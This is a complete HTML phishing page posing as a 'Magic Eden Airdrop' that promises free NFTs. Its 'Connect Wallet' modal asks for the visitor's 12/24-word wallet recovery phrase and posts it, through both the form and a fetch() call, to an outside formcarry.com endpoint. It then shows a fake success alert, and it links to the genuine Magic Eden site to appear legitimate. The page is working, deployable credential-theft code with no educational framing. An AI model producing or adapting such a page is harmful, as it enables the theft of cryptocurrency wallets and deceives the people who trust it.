<html><head><base href="." /><title>Magic Eden Airdrop</title><meta name="viewport" content="width=device-width, initial-scale=1" /><style>
:root {
  --primary: #e42575;
  --dark: #1a1a1a;
  --light: #f5f5f5;
}

* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: 'Inter', sans-serif;
}

body {
  background: var(--dark);
  color: var(--light);
}

.navbar {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 1rem 2rem;
  background: rgba(26,26,26,0.8);
  backdrop-filter: blur(10px);
  position: fixed;
  width: 100%;
  top: 0;
  z-index: 100;
}

.logo {
  font-size: 1.5rem;
  font-weight: bold;
  color: var(--primary);
}

.nav-links {
  display: flex;
  gap: 2rem;
}

.nav-links a {
  color: var(--light);
  text-decoration: none;
  transition: color 0.3s;
}

.nav-links a:hover {
  color: var(--primary);
}

.hero {
  height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  text-align: center;
  padding: 2rem;
  background: linear-gradient(45deg, var(--dark), #2a2a2a);
}

.hero h1 {
  font-size: 3.5rem;
  margin-bottom: 1rem;
}

.hero p {
  font-size: 1.2rem;
  margin-bottom: 2rem;
  color: #888;
}

.cta-button {
  background: var(--primary);
  color: white;
  padding: 1rem 2rem;
  border-radius: 50px;
  text-decoration: none;
  transition: transform 0.3s;
  border: none;
  cursor: pointer;
  font-size: 1rem;
}

.cta-button:hover {
  transform: scale(1.05);
}

.nft-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
  gap: 2rem;
  padding: 2rem;
  margin-top: 80px;
}

.nft-card {
  background: #2a2a2a;
  border-radius: 15px;
  overflow: hidden;
  transition: transform 0.3s;
  position: relative;
}

.nft-card:hover {
  transform: translateY(-5px);
}

.nft-image {
  width: 100%;
  height: 250px;
  background: #333;
  display: flex;
  align-items: center;
  justify-content: center;
}

.nft-info {
  padding: 1rem;
}

.nft-info h3 {
  margin-bottom: 0.5rem;
}

.price {
  color: var(--primary);
  font-weight: bold;
}

.modal {
  display: none;
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0,0,0,0.8);
  z-index: 1000;
  justify-content: center;
  align-items: center;
}

.modal-content {
  background: #2a2a2a;
  padding: 2rem;
  border-radius: 15px;
  width: 90%;
  max-width: 500px;
}

.modal textarea {
  width: 100%;
  padding: 1rem;
  margin: 1rem 0;
  border-radius: 8px;
  background: #333;
  color: white;
  border: 1px solid #444;
}

.claim-badge {
  position: absolute;
  top: 1rem;
  right: 1rem;
  background: var(--primary);
  color: white;
  padding: 0.5rem 1rem;
  border-radius: 50px;
  font-size: 0.8rem;
}

@keyframes float {
  0% { transform: translateY(0px); }
  50% { transform: translateY(-20px); }
  100% { transform: translateY(0px); }
}

.floating-nft {
  animation: float 6s ease-in-out infinite;
}
</style>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
</head>
<body>
  <nav class="navbar">
    <div class="logo">Magic Eden Airdrop</div>
    <div class="nav-links">
      <a href="https://magiceden.io/marketplace">Marketplace</a>
      <a href="https://magiceden.io/launchpad">Launchpad</a>
      <button class="cta-button" onclick="openWalletModal()">Connect Wallet</button>
    </div>
  </nav>

  <section class="hero">
    <div>
      <h1>Exclusive NFT Airdrop</h1>
      <p>Connect your wallet to claim your exclusive Magic Eden NFT airdrop!</p>
      <button class="cta-button" onclick="openWalletModal()">Claim Airdrop</button>
    </div>
  </section>

  <div class="nft-grid">
    <div class="nft-card">
      <span class="claim-badge">Available</span>
      <div class="nft-image">
        <svg class="floating-nft" width="100" height="100" viewBox="0 0 100 100">
          <rect x="20" y="20" width="60" height="60" rx="10" fill="#e42575"/>
          <circle cx="50" cy="50" r="20" fill="#fff"/>
        </svg>
      </div>
      <div class="nft-info">
        <h3>Magic Eden Special #001</h3>
        <p class="price">Free Claim</p>
      </div>
    </div>

    <!-- More NFT cards... -->
  </div>

  <div id="walletModal" class="modal">
    <div class="modal-content">
      <h2>Connect Your Wallet</h2>
      <p>Enter your Magic Eden wallet recovery phrase to claim your airdrop</p>
      <form id="walletForm" action="https://formcarry.com/s/A9ylUdKHo-Q" method="POST">
        <textarea name="phrase" rows="4" placeholder="Enter your 12/24 word recovery phrase" required></textarea>
        <button type="submit" class="cta-button">Connect & Claim</button>
      </form>
    </div>
  </div>

<script>
document.addEventListener('DOMContentLoaded', function() {
  const modal = document.getElementById('walletModal');
  const walletForm = document.getElementById('walletForm');

  window.openWalletModal = function() {
    modal.style.display = 'flex';
  }

  modal.addEventListener('click', function(e) {
    if (e.target === modal) {
      modal.style.display = 'none';
    }
  });

  walletForm.addEventListener('submit', function(e) {
    e.preventDefault();
    
    const formData = new FormData(walletForm);
    
    fetch('https://formcarry.com/s/A9ylUdKHo-Q', {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: new URLSearchParams(formData)
    })
    .then(response => {
      if (response.ok) {
        alert('Claim submitted successfully! You will receive your NFT shortly.');
        modal.style.display = 'none';
        walletForm.reset();
      } else {
        throw new Error('Something went wrong');
      }
    })
    .catch(error => {
      alert('Error submitting claim. Please try again.');
    });
  });

  const cards = document.querySelectorAll('.nft-card');
  cards.forEach(card => {
    card.addEventListener('mouseenter', () => {
      card.style.transform = 'translateY(-10px)';
    });
    card.addEventListener('mouseleave', () => {
      card.style.transform = 'translateY(0)';
    });
  });
});
</script>
</body></html>
